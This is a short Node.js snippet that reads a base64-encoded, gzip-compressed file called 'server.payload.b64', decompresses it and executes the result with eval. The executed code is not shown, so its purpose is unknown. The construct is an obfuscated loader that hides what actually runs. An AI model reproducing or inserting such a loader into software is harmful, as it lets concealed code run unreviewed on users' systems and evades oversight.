const zlib=require("zlib"),fs=require("fs"),path=require("path");
const p=fs.readFileSync(path.join(__dirname,"server.payload.b64"),"utf8").trim();
eval(zlib.gunzipSync(Buffer.from(p,"base64")).toString("utf8"));
